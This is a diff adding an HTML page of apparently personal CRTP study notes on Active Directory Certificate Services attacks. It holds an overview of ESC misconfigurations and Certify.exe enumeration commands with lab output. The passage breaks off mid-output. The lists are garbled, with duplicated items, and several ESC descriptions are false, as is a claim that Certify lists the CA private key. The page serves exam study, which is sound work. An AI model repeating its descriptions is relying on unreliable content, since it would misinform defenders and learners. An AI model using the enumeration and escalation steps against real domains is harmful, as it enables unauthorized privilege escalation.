@@ -1,0 +1,836 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ADCS Attacks - CRTP</title>
+  <link rel="shortcut icon" href="../../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    .crtp-sidebar { padding: 20px; }
+    .crtp-sidebar h3 { color: #ffdb70; margin-bottom: 15px; font-size: 1.1rem; }
+    .crtp-sidebar .home-link { 
+      display: block; 
+      padding: 10px 12px; 
+      margin-bottom: 15px; 
+      color: #ffdb70; 
+      text-decoration: none; 
+      border-radius: 6px; 
+      font-size: 0.9rem; 
+      font-weight: 600;
+      background: #2a2a2a;
+      transition: all 0.2s;
+    }
+    .crtp-sidebar .home-link:hover { 
+      background: #ffdb70; 
+      color: #1a1a1a; 
+    }
+    .crtp-sidebar a { display: block; padding: 8px 12px; margin: 4px 0; color: #d6d6d6; text-decoration: none; border-radius: 6px; font-size: 0.9rem; transition: all 0.2s; }
+    .crtp-sidebar a:hover { background: #2a2a2a; color: #ffdb70; }
+    .crtp-sidebar a.active { background: #ffdb70; color: #1a1a1a; font-weight: 600; }
+    .page-nav { display: flex; justify-content: space-between; margin: 30px 0; padding: 20px 0; border-top: 1px solid #2a2a2a; }
+    .nav-btn { background: #2a2a2a; color: #ffdb70; padding: 10px 20px; border-radius: 6px; text-decoration: none; transition: all 0.2s; }
+    .nav-btn:hover { background: #ffdb70; color: #1a1a1a; }
+    .notion-content { line-height: 1.6; }
+    .notion-content img { max-width: 100%; height: auto; margin: 20px 0; border-radius: 8px; }
+    .notion-content h1 { font-size: 1.8rem; margin: 30px 0 20px; color: #fafafa; }
+    .notion-content h2 { font-size: 1.5rem; margin: 25px 0 15px; color: #fafafa; }
+    .notion-content h3 { font-size: 1.3rem; margin: 20px 0 10px; color: #fafafa; }
+    .notion-content p { margin: 15px 0; color: #d6d6d6; }
+    .notion-content ul, .notion-content ol { margin: 15px 0; padding-left: 30px; }
+    .notion-content li { margin: 5px 0; color: #d6d6d6; }
+    .notion-content code { background: #2a2a2a; padding: 2px 6px; border-radius: 4px; font-family: 'Courier New', monospace; color: #ffdb70; }
+    .notion-content pre { background: #1e1e1e; border-left: 4px solid #ffdb70; padding: 15px; margin: 20px 0; border-radius: 0 8px 8px 0; overflow-x: auto; }
+    .notion-content pre code { background: transparent; padding: 0; color: #d6d6d6; }
+    .notion-content a { color: #ffdb70; text-decoration: underline; }
+    .notion-content strong { color: #fafafa; font-weight: 600; }
+    .notion-content em { font-style: italic; }
+    .notion-content figure { margin: 20px 0; }
+    .notion-content figcaption { display: none; }
+    .main-content { max-width: 100% !important; }
+    .about { max-width: 100% !important; padding: 20px 40px !important; }
+  </style>
+</head>
+<body>
+  <main>
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="../../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">CRTP Study Notes</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Navigation</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        <div class="crtp-sidebar">
+          <a href="../../" class="home-link">← Home</a>
+          <a href="../../certifications/" class="home-link">← Certifications</a>
+          <h3>Sections</h3>
+          <a href="enumeration.html" class="">Enumeration</a>
+          <a href="privilege-escalation.html" class="">Privilege Escalation</a>
+          <a href="privilege-escalation-domain-admin.html" class="">Privilege Escalation via Domain Admin</a>
+          <a href="golden-ticket.html" class="">Golden Ticket</a>
+          <a href="silver-ticket.html" class="">Silver Ticket</a>
+          <a href="diamond-ticket.html" class="">Diamond Ticket</a>
+          <a href="abusing-dsrm-credentials.html" class="">Abusing DSRM Credentials</a>
+          <a href="dcsync-attack.html" class="">DCSync Attack</a>
+          <a href="security-descriptor-abuse.html" class="">Security Descriptor Abuse</a>
+          <a href="asrep-roasting.html" class="">AS-REP Roasting</a>
+          <a href="unconstrained-delegation.html" class="">Unconstrained Delegation</a>
+          <a href="constrained-delegation.html" class="">Constrained Delegation</a>
+          <a href="rbcd.html" class="">RBCD</a>
+          <a href="sid-history-trust-ticket.html" class="">SID-History Trust Ticket</a>
+          <a href="sid-history-krbtgt.html" class="">SID-History KRBTGT</a>
+          <a href="cross-forest-trust.html" class="">Cross-Forest Trust</a>
+          <a href="adcs-attacks.html" class="active">ADCS Attacks</a>
+          <a href="trust-links-abuse.html" class="">Trust Links Abuse</a>
+          <a href="mde-mdi-bypass.html" class="">MDE/MDI Bypass</a>
+
+        </div>
+        <div class="separator"></div>
+        <ul class="contacts-list">
+          <li class="contact-item">
+            <div class="icon-box">
+              <ion-icon name="mail-outline"></ion-icon>
+            </div>
+            <div class="contact-info">
+              <p class="contact-title">Email</p>
+              <a href="mailto:daviosardinha@gmail.com" class="contact-link">daviosardinha@gmail.com</a>
+            </div>
+          </li>
+        </ul>
+      </div>
+    </aside>
+
+    <div class="main-content">
+      <article class="about active" data-page="about">
+        <header class="h2 article-title">ADCS Attacks</header>
+        <section class="about-text">
+          <div class="notion-content">
+<p>Active Directory Certificate Services (ADCS) is a crucial component of Microsoft's Active Directory (AD) infrastructure. 
+It enables organizations to create and manage their own internal public key infrastructure (PKI) for issuing digital certificates. 
+These certificates are used for various purposes such as encrypted email, digital signatures, and user authentication within the organization's environment.</p>
+<h3>Key Components of ADCS</h3>
+<ol>
+<li>
+<p>Internal Root CA: ADCS allows organizations to create their own internal root certificate authority (CA). This internal root CA is responsible for issuing digital certificates to various entities within the organization.</p>
+</li>
+<li>
+<p>Certificate Templates: ADCS provides a set of pre-defined certificate templates that can be used to generate digital certificates. These templates define the properties and settings for the certificates, such as the subject name, public key, and expiration date.</p>
+</li>
+<li>
+<p>Enrollment Services: ADCS includes enrollment services that manage the process of requesting, issuing, and revoking digital certificates. These services ensure that only authorized entities can request and obtain certificates.</p>
+</li>
+<li>
+<p>Certificate Revocation: ADCS includes mechanisms for revoking certificates that are no longer valid or have been compromised. This ensures that the organization's PKI remains secure and trustworthy.</p>
+</li>
+</ol>
+<h3>Critical Points in ADCS That Can Be Exploited</h3>
+<ol>
+<li>
+<p>Certificate Template Misconfigurations: If certificate templates are not properly configured, they can be exploited to issue certificates that can be used for malicious purposes. For example, a template that allows the subject name to be supplied in the request can be used to request a certificate for any user or computer.</p>
+</li>
+<li>
+<p>Enrollment Service Misconfigurations: If enrollment services are not properly configured, they can be exploited to request and obtain certificates without proper authorization. For example, if an enrollment service is configured to allow any user to request a certificate, an attacker can use this to obtain a certificate for a high-privileged user.</p>
+</li>
+<li>
+<p>Certificate Revocation List (CRL) Misconfigurations: If CRLs are not properly configured or updated, they can be exploited to issue certificates that are not revoked. This can lead to the use of compromised or expired certificates.</p>
+</li>
+<li>
+<p>Local Configuration: Each ADCS server can be locally configured to tune its behavior regarding day-to-day operations. This local configuration can be exploited if not properly secured, allowing unauthorized access to certificate management functions.</p>
+</li>
+<li>
+<p>Role-Based Access Control (RBAC): ADCS includes RBAC mechanisms to limit access to certificate management functions. However, if these mechanisms are not properly configured or if there are existing misconfigurations, they can be exploited to gain unauthorized access.</p>
+</li>
+</ol>
+<h3>Exploiting ADCS for Elevation of Privileges</h3>
+<ol>
+<li>
+<p>PKINIT: ADCS can be used to issue certificates that can be used for PKINIT, which allows for the authentication of users and computers. If an attacker can obtain a certificate for a high-privileged user, they can use PKINIT to authenticate as that user and gain elevated privileges.</p>
+</li>
+<li>
+<p>Certificate Templates with Extended Key Usages: If a certificate template includes extended key usages such as Client Authentication or Microsoft Smartcard Logon, it can be used to request a certificate that allows for authentication as a high-privileged user.</p>
+</li>
+</ol>
+<p>The most common vulnerabilities in Active Directory Certificate Services (AD CS) include:</p>
+<ol>
+<li>Certificate Template Misconfigurations:</li>
+<li>ESC1: Misconfigured certificate templates that allow low-privileged users to request certificates for any user or machine, enabling domain escalation.</li>
+<li>ESC2: Templates that allow unprivileged users to specify arbitrary Subject Alternative Names (SANs), enabling domain authentication.</li>
+<li>
+<p>ESC3: Templates that allow domain computer enrollment and client authentication, enabling NTLM relay attacks.</p>
+</li>
+<li>
+<p>ESC1: Misconfigured certificate templates that allow low-privileged users to request certificates for any user or machine, enabling domain escalation.</p>
+</li>
+<li>
+<p>ESC2: Templates that allow unprivileged users to specify arbitrary Subject Alternative Names (SANs), enabling domain authentication.</p>
+</li>
+<li>
+<p>ESC3: Templates that allow domain computer enrollment and client authentication, enabling NTLM relay attacks.</p>
+</li>
+<li>
+<p>PKI Object Access Control:</p>
+</li>
+<li>
+<p>ESC5: Insecure access control settings for CA server AD computer objects, RPC/DCOM servers, and AD containers, enabling attackers to compromise the PKI infrastructure and escalate privileges.</p>
+</li>
+<li>
+<p>ESC5: Insecure access control settings for CA server AD computer objects, RPC/DCOM servers, and AD containers, enabling attackers to compromise the PKI infrastructure and escalate privileges.</p>
+</li>
+<li>
+<p>Certificate Authority Access Control:</p>
+</li>
+<li>
+<p>ESC7: Flaws in CA permissions that grant administrative privileges, enabling modifications to persistent configuration data and bypassing manager approval requirements.</p>
+</li>
+<li>
+<p>ESC7: Flaws in CA permissions that grant administrative privileges, enabling modifications to persistent configuration data and bypassing manager approval requirements.</p>
+</li>
+<li>
+<p>NTLM Relay to Active Directory Certificate Services HTTP Endpoints:</p>
+</li>
+<li>
+<p>ESC8: Vulnerability in HTTP-based enrollment methods through additional server roles, enabling NTLM relay attacks and impersonation of authenticated users.</p>
+</li>
+<li>
+<p>ESC8: Vulnerability in HTTP-based enrollment methods through additional server roles, enabling NTLM relay attacks and impersonation of authenticated users.</p>
+</li>
+<li>
+<p>Lack of Auditing:</p>
+</li>
+<li>
+<p>ESC9: Failure to enable auditing on CA servers, making it difficult to detect and respond to threats.</p>
+</li>
+<li>
+<p>ESC9: Failure to enable auditing on CA servers, making it difficult to detect and respond to threats.</p>
+</li>
+<li>
+<p>Vulnerable PKI Object Access Control:</p>
+</li>
+<li>
+<p>ESC10: Insecure access control settings for various AD CS objects, enabling attackers to compromise the PKI infrastructure and escalate privileges.</p>
+</li>
+<li>
+<p>ESC10: Insecure access control settings for various AD CS objects, enabling attackers to compromise the PKI infrastructure and escalate privileges.</p>
+</li>
+<li>
+<p>EDITF_ATTRIBUTESUBJECTALTNAME2 Flag:</p>
+</li>
+<li>
+<p>ESC6: Enabling the EDITF_ATTRIBUTESUBJECTALTNAME2 flag allows the inclusion of user-defined values in the Subject Alternative Name (SAN) field, enabling attackers to abuse certificate templates that allow domain authentication.</p>
+</li>
+<li>
+<p>ESC6: Enabling the EDITF_ATTRIBUTESUBJECTALTNAME2 flag allows the inclusion of user-defined values in the Subject Alternative Name (SAN) field, enabling attackers to abuse certificate templates that allow domain authentication.</p>
+</li>
+<li>
+<p>Certificate Revocation List (CRL) Misconfigurations:</p>
+</li>
+<li>
+<p>ESC11: Failure to regularly update and distribute CRLs, enabling the use of compromised or expired certificates.</p>
+</li>
+<li>
+<p>ESC11: Failure to regularly update and distribute CRLs, enabling the use of compromised or expired certificates.</p>
+</li>
+<li>
+<p>Local Configuration:</p>
+</li>
+<li>
+<p>ESC12: Local configurations that are not properly secured, allowing unauthorized access to certificate management functions.</p>
+</li>
+<li>
+<p>ESC12: Local configurations that are not properly secured, allowing unauthorized access to certificate management functions.</p>
+</li>
+<li>
+<p>Role-Based Access Control (RBAC) Misconfigurations:</p>
+</li>
+<li>
+<p>ESC13: Misconfigured RBAC mechanisms that do not properly limit access to certificate management functions, enabling unauthorized access.</p>
+</li>
+<li>
+<p>ESC13: Misconfigured RBAC mechanisms that do not properly limit access to certificate management functions, enabling unauthorized access.</p>
+</li>
+</ol>
+<p>These vulnerabilities can be exploited to gain unauthorized access, escalate privileges, and compromise the security of the AD CS infrastructure.</p>
+<h1>Enumeration</h1>
+<p>To enumerate ADCS we can use Certify.exe, asking it to bring information about ADCS in the domain.</p>
+<p><code>Certify.exe cas</code></p>
+<div class="highlight"><pre><span></span><code>   <span class="n">_____</span>          <span class="n">_</span>   <span class="n">_</span>  <span class="n">__</span>
+  <span class="p">/</span> <span class="n">____</span><span class="p">|</span>        <span class="p">|</span> <span class="p">|</span> <span class="p">(</span><span class="n">_</span><span class="p">)/</span> <span class="n">_</span><span class="p">|</span>
+ <span class="p">|</span> <span class="p">|</span>     <span class="n">___</span> <span class="n">_</span> <span class="n">__</span><span class="p">|</span> <span class="p">|</span><span class="n">_</span> <span class="n">_</span><span class="p">|</span> <span class="p">|</span><span class="n">_</span> <span class="n">_</span>   <span class="n">_</span>
+ <span class="p">|</span> <span class="p">|</span>    <span class="p">/</span> <span class="n">_</span> <span class="p">\</span> <span class="s1">&#39;__| __| |  _| | | |</span>
+<span class="s1"> | |___|  __/ |  | |_| | | | |_| |</span>
+<span class="s1">  \_____\___|_|   \__|_|_|  \__, |</span>
+<span class="s1">                             __/ |</span>
+<span class="s1">                            |___./</span>
+<span class="s1">  v1.0.0</span>
+
+<span class="s1">[*] Action: Find certificate authorities</span>
+<span class="s1">[*] Using the search base &#39;</span><span class="n">CN</span><span class="p">=</span><span class="n">Configuration</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">moneycorp</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">local</span><span class="err">&#39;</span>
+
+<span class="p">[*]</span> <span class="n">Root</span> <span class="n">CAs</span>
+
+    <span class="n">Cert</span> <span class="n">SubjectName</span>              <span class="p">:</span> <span class="n">CN</span><span class="p">=</span><span class="n">moneycorp-MCORP-DC-CA</span><span class="p">,</span> <span class="n">DC</span><span class="p">=</span><span class="n">moneycorp</span><span class="p">,</span> <span class="n">DC</span><span class="p">=</span><span class="n">local</span>
+    <span class="n">Cert</span> <span class="n">Thumbprint</span>               <span class="p">:</span> <span class="n">8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8</span>
+    <span class="n">Cert</span> <span class="n">Serial</span>                   <span class="p">:</span> <span class="n">48D51C5ED50124AF43DB7A448BF68C49</span>
+    <span class="n">Cert</span> <span class="nb">Start </span><span class="n">Date</span>               <span class="p">:</span> <span class="n">11</span><span class="p">/</span><span class="n">26</span><span class="p">/</span><span class="n">2022</span> <span class="n">1</span><span class="p">:</span><span class="n">59</span><span class="p">:</span><span class="n">16</span> <span class="n">AM</span>
+    <span class="n">Cert</span> <span class="k">End</span> <span class="n">Date</span>                 <span class="p">:</span> <span class="n">11</span><span class="p">/</span><span class="n">26</span><span class="p">/</span><span class="n">2032</span> <span class="n">2</span><span class="p">:</span><span class="n">09</span><span class="p">:</span><span class="n">15</span> <span class="n">AM</span>
+    <span class="n">Cert</span> <span class="n">Chain</span>                    <span class="p">:</span> <span class="n">CN</span><span class="p">=</span><span class="n">moneycorp-MCORP-DC-CA</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">moneycorp</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">local</span>
+
+<span class="p">[*]</span> <span class="n">NTAuthCertificates</span> <span class="p">-</span> <span class="n">Certificates</span> <span class="n">that</span> <span class="n">enable</span> <span class="n">authentication</span><span class="p">:</span>
+
+    <span class="n">Cert</span> <span class="n">SubjectName</span>              <span class="p">:</span> <span class="n">CN</span><span class="p">=</span><span class="n">moneycorp-MCORP-DC-CA</span><span class="p">,</span> <span class="n">DC</span><span class="p">=</span><span class="n">moneycorp</span><span class="p">,</span> <span class="n">DC</span><span class="p">=</span><span class="n">local</span>
+    <span class="n">Cert</span> <span class="n">Thumbprint</span>               <span class="p">:</span> <span class="n">8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8</span>
+    <span class="n">Cert</span> <span class="n">Serial</span>                   <span class="p">:</span> <span class="n">48D51C5ED50124AF43DB7A448BF68C49</span>
+    <span class="n">Cert</span> <span class="nb">Start </span><span class="n">Date</span>               <span class="p">:</span> <span class="n">11</span><span class="p">/</span><span class="n">26</span><span class="p">/</span><span class="n">2022</span> <span class="n">1</span><span class="p">:</span><span class="n">59</span><span class="p">:</span><span class="n">16</span> <span class="n">AM</span>
+    <span class="n">Cert</span> <span class="k">End</span> <span class="n">Date</span>                 <span class="p">:</span> <span class="n">11</span><span class="p">/</span><span class="n">26</span><span class="p">/</span><span class="n">2032</span> <span class="n">2</span><span class="p">:</span><span class="n">09</span><span class="p">:</span><span class="n">15</span> <span class="n">AM</span>
+    <span class="n">Cert</span> <span class="n">Chain</span>                    <span class="p">:</span> <span class="n">CN</span><span class="p">=</span><span class="n">moneycorp-MCORP-DC-CA</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">moneycorp</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">local</span>
+
+<span class="p">[*]</span> <span class="n">Enterprise</span><span class="p">/</span><span class="n">Enrollment</span> <span class="n">CAs</span><span class="p">:</span>
+
+    <span class="n">Enterprise</span> <span class="n">CA</span> <span class="n">Name</span>            <span class="p">:</span> <span class="n">moneycorp-MCORP-DC-CA</span>
+    <span class="n">DNS</span> <span class="n">Hostname</span>                  <span class="p">:</span> <span class="n">mcorp-dc</span><span class="p">.</span><span class="n">moneycorp</span><span class="p">.</span><span class="n">local</span>
+    <span class="n">FullName</span>                      <span class="p">:</span> <span class="n">mcorp-dc</span><span class="p">.</span><span class="n">moneycorp</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">moneycorp-MCORP-DC-CA</span>
+    <span class="n">Flags</span>                         <span class="p">:</span> <span class="n">SUPPORTS_NT_AUTHENTICATION</span><span class="p">,</span> <span class="n">CA_SERVERTYPE_ADVANCED</span>
+    <span class="n">Cert</span> <span class="n">SubjectName</span>              <span class="p">:</span> <span class="n">CN</span><span class="p">=</span><span class="n">moneycorp-MCORP-DC-CA</span><span class="p">,</span> <span class="n">DC</span><span class="p">=</span><span class="n">moneycorp</span><span class="p">,</span> <span class="n">DC</span><span class="p">=</span><span class="n">local</span>
+    <span class="n">Cert</span> <span class="n">Thumbprint</span>               <span class="p">:</span> <span class="n">8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8</span>
+    <span class="n">Cert</span> <span class="n">Serial</span>                   <span class="p">:</span> <span class="n">48D51C5ED50124AF43DB7A448BF68C49</span>
+    <span class="n">Cert</span> <span class="nb">Start </span><span class="n">Date</span>               <span class="p">:</span> <span class="n">11</span><span class="p">/</span><span class="n">26</span><span class="p">/</span><span class="n">2022</span> <span class="n">1</span><span class="p">:</span><span class="n">59</span><span class="p">:</span><span class="n">16</span> <span class="n">AM</span>
+    <span class="n">Cert</span> <span class="k">End</span> <span class="n">Date</span>                 <span class="p">:</span> <span class="n">11</span><span class="p">/</span><span class="n">26</span><span class="p">/</span><span class="n">2032</span> <span class="n">2</span><span class="p">:</span><span class="n">09</span><span class="p">:</span><span class="n">15</span> <span class="n">AM</span>
+    <span class="n">Cert</span> <span class="n">Chain</span>                    <span class="p">:</span> <span class="n">CN</span><span class="p">=</span><span class="n">moneycorp-MCORP-DC-CA</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">moneycorp</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">local</span>
+    <span class="p">[!]</span> <span class="n">UserSpecifiedSAN</span> <span class="p">:</span> <span class="n">EDITF_ATTRIBUTESUBJECTALTNAME2</span> <span class="n">set</span><span class="p">,</span> <span class="n">enrollees</span> <span class="n">can</span> <span class="n">specify</span> <span class="n">Subject</span> <span class="n">Alternative</span> <span class="n">Names</span><span class="p">!</span>
+    <span class="n">CA</span> <span class="n">Permissions</span>                <span class="p">:</span>
+      <span class="n">Owner</span><span class="p">:</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span>        <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">32</span><span class="p">-</span><span class="n">544</span>
+
+      <span class="n">Access</span> <span class="n">Rights</span>                                     <span class="n">Principal</span>
+
+      <span class="n">Allow</span>  <span class="n">Enroll</span>                                     <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">Authenticated</span> <span class="n">UsersS</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">11</span>
+      <span class="n">Allow</span>  <span class="n">ManageCA</span><span class="p">,</span> <span class="n">ManageCertificates</span>               <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span>        <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">32</span><span class="p">-</span><span class="n">544</span>
+      <span class="n">Allow</span>  <span class="n">ManageCA</span><span class="p">,</span> <span class="n">ManageCertificates</span>               <span class="n">mcorp</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">512</span>
+      <span class="n">Allow</span>  <span class="n">ManageCA</span><span class="p">,</span> <span class="n">ManageCertificates</span>               <span class="n">mcorp</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>       <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">519</span>
+    <span class="n">Enrollment</span> <span class="n">Agent</span> <span class="n">Restrictions</span> <span class="p">:</span> <span class="n">None</span>
+
+    <span class="n">Enabled</span> <span class="n">Certificate</span> <span class="n">Templates</span><span class="p">:</span>
+        <span class="n">CA-Integration</span>
+        <span class="n">HTTPSCertificates</span>
+        <span class="n">SmartCardEnrollment-Agent</span>
+        <span class="n">SmartCardEnrollment-Users</span>
+        <span class="n">DirectoryEmailReplication</span>
+        <span class="n">DomainControllerAuthentication</span>
+        <span class="n">KerberosAuthentication</span>
+        <span class="n">EFSRecovery</span>
+        <span class="n">EFS</span>
+        <span class="n">DomainController</span>
+        <span class="n">WebServer</span>
+        <span class="n">Machine</span>
+        <span class="n">User</span>
+        <span class="n">SubCA</span>
+        <span class="n">Administrator</span>
+</code></pre></div>
+
+<p>When you execute the command <code>certify.exe cas</code> in a Windows command prompt, the following types of enumeration will occur:</p>
+<ol>
+<li>Certificate Authority (CA) Information:</li>
+<li>Thecertify.execommand is used to manage and manipulate certificates in Active Directory Certificate Services (AD CS). Thecasoption stands for Certificate Authority Server.</li>
+<li>
+<p>This command will enumerate the CA server configuration, including the CA name, certificate, and certificate templates.</p>
+</li>
+<li>
+<p>The certify.exe command is used to manage and manipulate certificates in Active Directory Certificate Services (AD CS). The cas option stands for Certificate Authority Server.</p>
+</li>
+<li>
+<p>This command will enumerate the CA server configuration, including the CA name, certificate, and certificate templates.</p>
+</li>
+<li>
+<p>Certificate Templates:</p>
+</li>
+<li>
+<p>The command will list the available certificate templates, including their names, descriptions, and settings.</p>
+</li>
+<li>
+<p>The command will list the available certificate templates, including their names, descriptions, and settings.</p>
+</li>
+<li>
+<p>Certificate Enrollment:</p>
+</li>
+<li>
+<p>The command will also enumerate the certificate enrollment settings, including the enrollment protocols and the certificate revocation list (CRL).</p>
+</li>
+<li>
+<p>The command will also enumerate the certificate enrollment settings, including the enrollment protocols and the certificate revocation list (CRL).</p>
+</li>
+<li>
+<p>Certificate Revocation List (CRL):</p>
+</li>
+<li>
+<p>The command will list the CRLs associated with the CA, including the CRL distribution points and the CRL publication points.</p>
+</li>
+<li>
+<p>The command will list the CRLs associated with the CA, including the CRL distribution points and the CRL publication points.</p>
+</li>
+<li>
+<p>Certificate Authority (CA) Roles:</p>
+</li>
+<li>
+<p>The command will enumerate the roles assigned to the CA, including the CA roles and the CA permissions.</p>
+</li>
+<li>
+<p>The command will enumerate the roles assigned to the CA, including the CA roles and the CA permissions.</p>
+</li>
+<li>
+<p>Certificate Authority (CA) Configuration:</p>
+</li>
+<li>
+<p>The command will list the CA configuration settings, including the CA certificate, CA private key, and CA certificate templates.</p>
+</li>
+<li>
+<p>The command will list the CA configuration settings, including the CA certificate, CA private key, and CA certificate templates.</p>
+</li>
+</ol>
+<p>These enumerations will provide detailed information about the CA server, certificate templates, certificate enrollment, CRLs, and CA roles, which can be useful to identify potential vulnerabilities and misconfigurations in the AD CS infrastructure.</p>
+<p>Here is a brief summary of the output from <code>certify.exe</code>:</p>
+<h3>Summary</h3>
+<ul>
+<li>
+<p>Certificate Authorities: The output lists three types of certificate authorities: Root CAs, NTAuthCertificates, and Enterprise/Enrollment CAs.</p>
+</li>
+<li>
+<p>Root CAs: The Root CAs section lists the subject name, thumbprint, serial number, start date, end date, and certificate chain for the root certificate authority.</p>
+</li>
+<li>
+<p>NTAuthCertificates: The NTAuthCertificates section lists the subject name, thumbprint, serial number, start date, end date, and certificate chain for the certificates that enable NTLM authentication.</p>
+</li>
+<li>
+<p>Enterprise/Enrollment CAs: The Enterprise/Enrollment CAs section lists the enterprise CA name, DNS hostname, full name, flags, subject name, thumbprint, serial number, start date, end date, and certificate chain for the enterprise CA.</p>
+</li>
+<li>
+<p>UserSpecifiedSAN: The output indicates that the UserSpecifiedSAN flag is set, allowing users to specify Subject Alternative Names.</p>
+</li>
+<li>
+<p>CA Permissions: The output lists the permissions for the CA, including the owner and access rights.</p>
+</li>
+<li>
+<p>Enabled Certificate Templates: The output lists the enabled certificate templates for the enterprise CA.</p>
+</li>
+</ul>
+<h3>Key Points</h3>
+<ul>
+<li>
+<p>Certificate Authority Information: The output provides detailed information about the certificate authorities, including their subject names, thumbprints, serial numbers, start dates, end dates, and certificate chains.</p>
+</li>
+<li>
+<p>Certificate Template Information: The output lists the enabled certificate templates for the enterprise CA.</p>
+</li>
+<li>
+<p>UserSpecifiedSAN: The output indicates that the UserSpecifiedSAN flag is set, allowing users to specify Subject Alternative Names.</p>
+</li>
+<li>
+<p>CA Permissions: The output lists the permissions for the CA, including the owner and access rights.</p>
+</li>
+</ul>
+<h3>Potential Issues</h3>
+<ul>
+<li>
+<p>Certificate Expiration: The output lists the start and end dates for each certificate, indicating potential expiration issues.</p>
+</li>
+<li>
+<p>Certificate Chain Issues: The output lists the certificate chain for each certificate, indicating potential chain issues.</p>
+</li>
+<li>
+<p>UserSpecifiedSAN: The output indicates that the UserSpecifiedSAN flag is set, allowing users to specify Subject Alternative Names, which could be a potential security issue.</p>
+</li>
+</ul>
+<p>The output from <code>certify.exe</code> provides detailed information about the certificate authorities, certificate templates, and permissions for the enterprise CA. It highlights potential issues such as certificate expiration and certificate chain issues, and indicates that the UserSpecifiedSAN flag is set, allowing users to specify Subject Alternative Names.</p>
+<p>Now let’s list all the templates configured in this ADCS in the domain. The following command will enumerate all Templates configured.</p>
+<p><code>Cerify.exe find</code></p>
+<div class="highlight"><pre><span></span><code>    <span class="n">Code</span> <span class="n">Snippet</span><span class="p">-------------------</span>
+    <span class="n">CA</span> <span class="n">Name</span>                               <span class="p">:</span> <span class="n">mcorp-dc</span><span class="p">.</span><span class="n">moneycorp</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">moneycorp-MCORP-DC-CA</span>
+    <span class="n">Template</span> <span class="n">Name</span>                         <span class="p">:</span> <span class="n">SmartCardEnrollment-Users</span>
+    <span class="n">Schema</span> <span class="n">Version</span>                        <span class="p">:</span> <span class="n">2</span>
+    <span class="n">Validity</span> <span class="n">Period</span>                       <span class="p">:</span> <span class="n">10</span> <span class="n">years</span>
+    <span class="n">Renewal</span> <span class="n">Period</span>                        <span class="p">:</span> <span class="n">6</span> <span class="n">weeks</span>
+    <span class="n">msPKI-Certificates-Name-Flag</span>          <span class="p">:</span> <span class="n">SUBJECT_ALT_REQUIRE_UPN</span><span class="p">,</span> <span class="n">SUBJECT_REQUIRE_DIRECTORY_PATH</span>
+    <span class="n">mspki-enrollment-flag</span>                 <span class="p">:</span> <span class="n">AUTO_ENROLLMENT</span>
+    <span class="n">Authorized</span> <span class="n">Signatures</span> <span class="n">Required</span>        <span class="p">:</span> <span class="n">1</span>
+    <span class="n">Application</span> <span class="n">Policies</span>                  <span class="p">:</span> <span class="n">Certificate</span> <span class="n">Request</span> <span class="n">Agent</span>
+    <span class="n">pkiextendedkeyusage</span>                   <span class="p">:</span> <span class="n">Client</span> <span class="n">Authentication</span><span class="p">,</span> <span class="n">Encrypting</span> <span class="n">File</span> <span class="n">System</span><span class="p">,</span> <span class="n">Secure</span> <span class="n">Email</span>
+    <span class="n">mspki-certificate-application-policy</span>  <span class="p">:</span> <span class="n">Client</span> <span class="n">Authentication</span><span class="p">,</span> <span class="n">Encrypting</span> <span class="n">File</span> <span class="n">System</span><span class="p">,</span> <span class="n">Secure</span> <span class="n">Email</span>
+    <span class="n">Permissions</span>
+      <span class="n">Enrollment</span> <span class="n">Permissions</span>
